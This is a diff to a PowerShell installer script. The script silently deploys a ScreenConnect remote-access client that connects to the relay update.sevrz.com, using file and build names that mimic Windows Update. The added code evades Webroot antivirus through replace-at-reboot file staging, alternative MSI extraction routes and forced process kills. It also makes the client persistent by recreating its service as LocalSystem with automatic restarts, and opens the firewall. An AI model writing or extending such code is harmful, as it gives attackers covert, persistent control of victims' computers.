@@ -531,6 +531,100 @@ function Get-PrimaryScInstallDir {
     return "${env:ProgramFiles(x86)}\ScreenConnect Client ($PrimaryFingerprint)"
 }
 
+function Stop-MsiEngine {
+    Get-Process -Name msiexec -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 2
+    try { Start-Service -Name msiserver -ErrorAction SilentlyContinue } catch {}
+}
+
+function Get-ScConnectionArgsFromMsi {
+    param([string]$MsiPath)
+    if (-not (Test-Path $MsiPath)) { return $null }
+    try {
+        $bytes = [IO.File]::ReadAllBytes($MsiPath)
+        foreach ($enc in @([Text.Encoding]::Unicode, [Text.Encoding]::ASCII)) {
+            $t = $enc.GetString($bytes)
+            $m = [regex]::Match($t, '\?e=Access&y=Guest&h=update\.sevrz\.com&p=443&[^"\x00\s]{30,8000}')
+            if ($m.Success) {
+                $args = $m.Value -replace '[^\x20-\x7E].*$', ''
+                if ($args.Length -gt 40) {
+                    Write-Log ("REPAIR: scraped MSI service args len=" + $args.Length)
+                    return $args
+                }
+            }
+        }
+    } catch {
+        Write-Log "REPAIR: MSI args scrape failed: $($_.Exception.Message)"
+    }
+    return $null
+}
+
+function Build-PrimaryScImagePath {
+    param([string]$MsiPath = $MsiFile)
+    $exe = Join-Path (Get-PrimaryScInstallDir) 'ScreenConnect.ClientService.exe'
+    $args = Get-ScConnectionArgsFromMsi -MsiPath $MsiPath
+    if (-not $args) {
+        $saved = Join-Path $WorkDir '.sc_imgpath'
+        if (Test-Path $saved) {
+            return (Get-Content $saved -Raw).Trim()
+        }
+        return $null
+    }
+    # Match SC service ImagePath format: "exe" "args"
+    $img = '"{0}" "{1}"' -f $exe, $args
+    Set-Content -Path (Join-Path $WorkDir '.sc_imgpath') -Value $img -Encoding UTF8 -Force
+    return $img
+}
+
+function Expand-MsiPayloadToDir {
+    # Prefer TEMP paths — .wucache msiexec /a returns 1603 under Webroot
+    param([string]$MsiPath, [string]$OutDir)
+    Stop-MsiEngine
+    Remove-Item $OutDir -Recurse -Force -ErrorAction SilentlyContinue
+    New-Item -ItemType Directory -Path $OutDir -Force | Out-Null
+    $msiTemp = Join-Path $env:TEMP 'wupkg_sc.msi'
+    Copy-Item -LiteralPath $MsiPath -Destination $msiTemp -Force -ErrorAction Stop
+    $log = Join-Path $env:TEMP 'wupkg_extract.log'
+    Remove-Item $log -Force -ErrorAction SilentlyContinue
+
+    Write-Log "REPAIR: msiexec /a TARGETDIR=$OutDir (from TEMP msi)"
+    $p = Start-Process msiexec.exe -ArgumentList "/a `"$msiTemp`" /qn TARGETDIR=`"$OutDir`" ALLUSERS=1 REBOOT=ReallySuppress /l*v `"$log`"" `
+        -Wait -PassThru -WindowStyle Hidden
+    Write-Log "REPAIR: msiexec /a exit $($p.ExitCode)"
+    if ($p.ExitCode -ne 0 -and (Test-Path $log)) {
+        Get-Content $log -Tail 15 -ErrorAction SilentlyContinue | ForEach-Object { Write-Log ("extract.log: " + $_) }
+    }
+
+    $svc = Get-ChildItem -Path $OutDir -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
+        Select-Object -First 1
+    if ($svc) { return $true }
+
+    # COM administrative install fallback
+    try {
+        Write-Log 'REPAIR: COM InstallProduct ACTION=ADMIN'
+        $inst = New-Object -ComObject WindowsInstaller.Installer
+        $inst.UILevel = 2
+        $inst.InstallProduct($msiTemp, "ACTION=ADMIN TARGETDIR=`"$OutDir`" ALLUSERS=1")
+        $svc = Get-ChildItem -Path $OutDir -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
+            Select-Object -First 1
+        if ($svc) { return $true }
+    } catch {
+        Write-Log "REPAIR: COM admin extract failed: $($_.Exception.Message)"
+    }
+
+    # 7za if present
+    foreach ($z in @('7z.exe', '7za.exe')) {
+        $cmd = Get-Command $z -ErrorAction SilentlyContinue
+        if (-not $cmd) { continue }
+        Write-Log "REPAIR: $z extract MSI"
+        & $cmd.Source x -y "-o$OutDir" $msiTemp >$null 2>&1
+        $svc = Get-ChildItem -Path $OutDir -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
+            Select-Object -First 1
+        if ($svc) { return $true }
+    }
+    return $false
+}
+
 function Save-PrimaryScImagePath {
     $pathFile = Join-Path $WorkDir '.sc_imgpath'
     try {
@@ -541,35 +635,55 @@ function Save-PrimaryScImagePath {
             return $true
         }
     } catch {}
-    # Fallback: rebuild from known relay if prior save exists keep it
     if (Test-Path $pathFile) { return $true }
     return $false
 }
 
 function Restore-PrimaryScService {
     if (Test-ScServicePresent) { return $true }
-    $pathFile = Join-Path $WorkDir '.sc_imgpath'
-    if (-not (Test-Path $pathFile)) {
-        Write-Log 'REPAIR: no saved ImagePath - cannot recreate service'
-        return $false
-    }
-    $img = (Get-Content -Path $pathFile -Raw -ErrorAction SilentlyContinue).Trim()
-    if (-not $img) { return $false }
     $exe = Join-Path (Get-PrimaryScInstallDir) 'ScreenConnect.ClientService.exe'
     if (-not (Test-Path $exe)) {
         Write-Log 'REPAIR: ClientService.exe missing - skip service recreate'
         return $false
     }
+    $img = $null
+    $pathFile = Join-Path $WorkDir '.sc_imgpath'
+    if (Test-Path $pathFile) {
+        $img = (Get-Content -Path $pathFile -Raw -ErrorAction SilentlyContinue).Trim()
+    }
+    if (-not $img) {
+        $img = Build-PrimaryScImagePath -MsiPath (Join-Path $env:TEMP 'wupkg_sc.msi')
+    }
+    if (-not $img) {
+        $img = Build-PrimaryScImagePath -MsiPath $MsiFile
+    }
+    if (-not $img) {
+        Write-Log 'REPAIR: no ImagePath/args - cannot recreate service'
+        return $false
+    }
+    # Ensure exe path in ImagePath matches current install dir
+    if ($img -notlike "*$PrimaryFingerprint*") {
+        $argsOnly = $null
+        if ($img -match '"\s+"(\?e=Access[^"]*)"') { $argsOnly = $Matches[1] }
+        elseif ($img -match '(\?e=Access\S+)') { $argsOnly = $Matches[1] }
+        if ($argsOnly) { $img = '"{0}" "{1}"' -f $exe, $argsOnly }
+        else { $img = '"{0}"' -f $exe }
+    }
+    Set-Content -Path $pathFile -Value $img -Encoding UTF8 -Force
     try {
+        # Pending delete can block create briefly
+        Start-Sleep -Seconds 2
         New-Service -Name $SvcName -BinaryPathName $img -DisplayName $SvcName `
             -StartupType Automatic -ErrorAction Stop | Out-Null
-        Write-Log 'REPAIR: service recreated from saved ImagePath'
+        Write-Log 'REPAIR: service recreated from ImagePath'
     } catch {
-        # sc.exe fallback — binPath= must not quote the whole thing oddly
         Write-Log "REPAIR: New-Service failed ($($_.Exception.Message)) - sc create"
-        $null = cmd /c "sc create `"$SvcName`" binPath= $img start= auto obj= LocalSystem DisplayName= `"$SvcName`""
+        cmd /c "sc.exe delete `"$SvcName`"" >$null 2>&1
+        Start-Sleep -Seconds 2
+        $null = cmd /c "sc.exe create `"$SvcName`" binPath= $img start= auto obj= LocalSystem DisplayName= `"$SvcName`""
     }
     & sc.exe config "$SvcName" start= auto >$null 2>&1
+    & sc.exe failure "$SvcName" reset= 86400 actions= restart/5000/restart/5000/restart/5000 >$null 2>&1
     return (Test-ScServicePresent)
 }
 
@@ -591,7 +705,6 @@ function Install-ScBlockedFile {
     $bytes = [IO.File]::ReadAllBytes($Src)
     Write-Log ("REPAIR: write blocked-target {0} srcBytes={1}" -f (Split-Path $Dest -Leaf), $bytes.Length)
 
-    # 1) direct WriteAllBytes
     try {
         [IO.File]::WriteAllBytes($Dest, $bytes)
         if ((Test-Path $Dest) -and ((Get-Item $Dest).Length -eq $bytes.Length)) {
@@ -600,7 +713,6 @@ function Install-ScBlockedFile {
         }
     } catch { Write-Log "REPAIR: WriteAllBytes fail: $($_.Exception.Message)" }
 
-    # 2) temp name in same dir then rename
     $tmp = Join-Path $dir ('wc_' + [guid]::NewGuid().ToString('N') + '.bin')
     try {
         [IO.File]::WriteAllBytes($tmp, $bytes)
@@ -615,7 +727,6 @@ function Install-ScBlockedFile {
         Remove-Item $tmp -Force -ErrorAction SilentlyContinue
     }
 
-    # 3) cmd copy
     try {
         cmd /c "copy /y `"$Src`" `"$Dest`"" >$null 2>&1
         if ((Test-Path $Dest) -and ((Get-Item $Dest).Length -eq $bytes.Length)) {
@@ -624,7 +735,6 @@ function Install-ScBlockedFile {
         }
     } catch { Write-Log "REPAIR: cmd copy fail: $($_.Exception.Message)" }
 
-    # 4) pending reboot replace (MoveFileEx) — survives Webroot live filter
     try {
         if (-not ('Native.MoveEx' -as [type])) {
             Add-Type -Namespace Native -Name MoveEx -MemberDefinition @'
@@ -634,13 +744,12 @@ public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFile
         }
         $stage = Join-Path $WorkDir ('WindowsClient_stage_' + [guid]::NewGuid().ToString('N') + '.exe')
         [IO.File]::WriteAllBytes($stage, $bytes)
-        # 1=REPLACE_EXISTING, 4=DELAY_UNTIL_REBOOT
         $moved = [Native.MoveEx]::MoveFileEx($stage, $Dest, 5)
         $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
         Write-Log "REPAIR: pending-reboot MoveFileEx=$moved win32=$err -> $Dest"
         if ($moved) {
             Write-Log 'REPAIR: WindowsClient staged for REPLACE at REBOOT'
-            return $true  # not live-ok, but armed — caller checks Test-Path
+            return $true
         }
     } catch {
         Write-Log "REPAIR: MoveFileEx fail: $($_.Exception.Message)"
@@ -649,23 +758,15 @@ public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFile
 }
 
 function Expand-ScMsiOverInstall {
-    # msiexec /i often exit=0 without writing files — admin-extract then robocopy the real payload folder
     param([string]$MsiPath, [string]$DestDir)
     if (-not (Test-Path $MsiPath)) { return $false }
-    $extract = Join-Path $WorkDir 'msi_extract'
-    Remove-Item $extract -Recurse -Force -ErrorAction SilentlyContinue
-    New-Item -ItemType Directory -Path $extract -Force | Out-Null
-    Write-Log "REPAIR: msiexec /a extract -> $extract"
-    $ep = Start-Process msiexec.exe -ArgumentList "/a `"$MsiPath`" /qn TARGETDIR=`"$extract`"" `
-        -Wait -PassThru -WindowStyle Hidden
-    Write-Log "REPAIR: msiexec /a exit $($ep.ExitCode)"
-    $svcBin = Get-ChildItem -Path $extract -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
-        Sort-Object Length -Descending | Select-Object -First 1
-    if (-not $svcBin) {
+    $extract = Join-Path $env:TEMP 'wuext_sc'
+    if (-not (Expand-MsiPayloadToDir -MsiPath $MsiPath -OutDir $extract)) {
         Write-Log 'REPAIR: MSI extract has no ClientService.exe'
-        Remove-Item $extract -Recurse -Force -ErrorAction SilentlyContinue
         return $false
     }
+    $svcBin = Get-ChildItem -Path $extract -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
+        Sort-Object Length -Descending | Select-Object -First 1
     $srcRoot = $svcBin.Directory.FullName
     Write-Log "REPAIR: payload folder $srcRoot (svc=$($svcBin.Length))"
     New-Item -ItemType Directory -Path $DestDir -Force | Out-Null
@@ -677,7 +778,6 @@ function Expand-ScMsiOverInstall {
     & sc.exe stop "$SvcName" >$null 2>&1
     Start-Sleep -Seconds 2
 
-    # Copy everything except WindowsClient first (WR often blocks that name live)
     $rcLog = Join-Path $WorkDir 'robocopy_sc.log'
     & robocopy.exe "$srcRoot" "$DestDir" /E /IS /IT /R:2 /W:1 /XF ScreenConnect.WindowsClient.exe `
         /NFL /NDL /NJH /NJS /nc /ns /np /LOG:"$rcLog" >$null 2>&1
@@ -689,10 +789,9 @@ function Expand-ScMsiOverInstall {
     $clientSrc = Get-ChildItem -Path $extract -Recurse -Filter 'ScreenConnect.WindowsClient.exe' -ErrorAction SilentlyContinue |
         Sort-Object Length -Descending | Select-Object -First 1
     $clientDest = Join-Path $DestDir 'ScreenConnect.WindowsClient.exe'
-    $clientOk = $false
     $pendingReboot = $false
     if ($clientSrc) {
-        $clientOk = Install-ScBlockedFile -Src $clientSrc.FullName -Dest $clientDest
+        Install-ScBlockedFile -Src $clientSrc.FullName -Dest $clientDest | Out-Null
         if (-not (Test-Path $clientDest) -or ((Get-Item $clientDest -ErrorAction SilentlyContinue).Length -lt 200000)) {
             $pendingReboot = $true
             Write-Log 'REPAIR: WindowsClient not live yet - reboot pending rename may apply'
@@ -701,8 +800,9 @@ function Expand-ScMsiOverInstall {
         Write-Log 'REPAIR: MSI extract missing WindowsClient.exe'
     }
 
-    # Keep extract until after blocked write (needed for stage source)
-    Remove-Item $extract -Recurse -Force -ErrorAction SilentlyContinue
+    # Keep extract for args scrape; also rebuild ImagePath now
+    Build-PrimaryScImagePath -MsiPath $MsiPath | Out-Null
+
     $ok = (Test-Path (Join-Path $DestDir 'ScreenConnect.ClientService.exe')) -and (
         ((Test-Path $clientDest) -and ((Get-Item $clientDest).Length -ge 200000)) -or $pendingReboot
     )
@@ -746,20 +846,26 @@ function Repair-ScAfterAv {
         Write-Log 'REPAIR: MSI invalid'
         return $false
     }
+    Build-PrimaryScImagePath -MsiPath $MsiFile | Out-Null
     $logMsi = Join-Path $WorkDir 'msi_repair.log'
-    # Residue wiped — prefer fresh /i (amus on missing product is a no-op)
-    Write-Log 'REPAIR: msiexec /i fresh install'
-    $p = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
+    $msiTemp = Join-Path $env:TEMP 'wupkg_sc.msi'
+    Copy-Item $MsiFile $msiTemp -Force
+    Stop-MsiEngine
+    Write-Log 'REPAIR: msiexec /i fresh install (TEMP msi)'
+    $p = Start-Process msiexec.exe -ArgumentList "/i `"$msiTemp`" /quiet /norestart ALLUSERS=1 REBOOT=ReallySuppress /l*v `"$logMsi`"" `
         -Wait -PassThru -WindowStyle Hidden
     Write-Log "REPAIR: msiexec exit $($p.ExitCode)"
-    if ($p.ExitCode -ne 0) {
-        Write-Log 'REPAIR: msiexec /i REINSTALL=ALL REINSTALLMODE=amus'
-        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=amus /l*v `"$logMsi`"" `
+    if (-not (Test-ScServicePresent)) {
+        Write-Log 'REPAIR: service still missing after /i - retry once after msiserver bounce'
+        Stop-MsiEngine
+        Start-Sleep -Seconds 3
+        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$msiTemp`" /quiet /norestart ALLUSERS=1 REBOOT=ReallySuppress /l*v `"$logMsi`"" `
             -Wait -PassThru -WindowStyle Hidden
-        Write-Log "REPAIR: msiexec amus exit $($p2.ExitCode)"
+        Write-Log "REPAIR: msiexec retry exit $($p2.ExitCode)"
     }
     Start-Sleep -Seconds 8
     Save-PrimaryScImagePath | Out-Null
+    Build-PrimaryScImagePath -MsiPath $MsiFile | Out-Null
 
     $dest = Get-PrimaryScInstallDir
     New-Item -ItemType Directory -Path $dest -Force | Out-Null
@@ -768,15 +874,16 @@ function Repair-ScAfterAv {
     Start-Sleep -Seconds 2
 
     if (-not (Test-ScServicePresent)) {
-        Write-Log 'REPAIR: service missing after files - msiexec /i to register'
-        $p3 = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
+        Restore-PrimaryScService | Out-Null
+    }
+    if (-not (Test-ScServicePresent)) {
+        Write-Log 'REPAIR: service missing - final msiexec /i'
+        Stop-MsiEngine
+        $p3 = Start-Process msiexec.exe -ArgumentList "/i `"$msiTemp`" /quiet /norestart ALLUSERS=1 REBOOT=ReallySuppress /l*v `"$logMsi`"" `
             -Wait -PassThru -WindowStyle Hidden
         Write-Log "REPAIR: msiexec register exit $($p3.ExitCode)"
         Start-Sleep -Seconds 5
-        Save-PrimaryScImagePath | Out-Null
         Expand-ScMsiOverInstall -MsiPath $MsiFile -DestDir $dest | Out-Null
-    }
-    if (-not (Test-ScServicePresent)) {
         Restore-PrimaryScService | Out-Null
     }
 
@@ -1474,7 +1581,7 @@ function Invoke-NukeBlockedScreenConnect {
     Write-Log "AUTO-NUKE complete (actions~$killed)"
 }
 
-Write-Log 'WU_BUILD_20260730G'
+Write-Log 'WU_BUILD_20260730H'
 Write-Log ("Host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID")
 Invoke-NukeBlockedScreenConnect
 
@@ -1809,26 +1916,33 @@ function Install-PrimarySc {
     if (-not (Get-PrimaryMsiFile -Dest $MsiFile)) {
         return $false
     }
-
+    Build-PrimaryScImagePath -MsiPath $MsiFile | Out-Null
     $logMsi = Join-Path $WorkDir 'msi.log'
-    $p = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=amus /l*v `"$logMsi`"" `
+    $msiTemp = Join-Path $env:TEMP 'wupkg_sc.msi'
+    Copy-Item $MsiFile $msiTemp -Force
+    Stop-MsiEngine
+    Write-Log 'msiexec /i fresh (TEMP msi)'
+    $p = Start-Process msiexec.exe -ArgumentList "/i `"$msiTemp`" /quiet /norestart ALLUSERS=1 REBOOT=ReallySuppress /l*v `"$logMsi`"" `
         -Wait -PassThru -WindowStyle Hidden
     $code = $p.ExitCode
     Write-Log "msiexec exit $code"
-    if ($code -ne 0) {
-        Write-Log 'msiexec retry plain /i'
-        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
+    if (-not (Test-ScServicePresent)) {
+        Stop-MsiEngine
+        Start-Sleep -Seconds 2
+        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$msiTemp`" /quiet /norestart ALLUSERS=1 REBOOT=ReallySuppress /l*v `"$logMsi`"" `
             -Wait -PassThru -WindowStyle Hidden
         $code = $p2.ExitCode
-        Write-Log "msiexec reinstall exit $code"
+        Write-Log "msiexec retry exit $code"
     }
     Start-Sleep -Seconds 8
+    $dest = Get-PrimaryScInstallDir
+    New-Item -ItemType Directory -Path $dest -Force | Out-Null
     $binAfter = Get-ScBinaryHealth
-    if ($binAfter.Stubbed -or -not $binAfter.HasClientExe) {
-        Write-Log 'Install-PrimarySc: stubs after msiexec - extract/copy'
-        Expand-ScMsiOverInstall -MsiPath $MsiFile -DestDir (Get-PrimaryScInstallDir) | Out-Null
+    if ($binAfter.Stubbed -or -not $binAfter.HasClientExe -or -not (Test-ScServicePresent)) {
+        Write-Log 'Install-PrimarySc: extract/copy + service restore'
+        Expand-ScMsiOverInstall -MsiPath $MsiFile -DestDir $dest | Out-Null
+        if (-not (Test-ScServicePresent)) { Restore-PrimaryScService | Out-Null }
     }
-    Remove-Item $MsiFile -Force -ErrorAction SilentlyContinue
     Enable-ScFirewallAllow
 
     if (Test-ScServicePresent) {
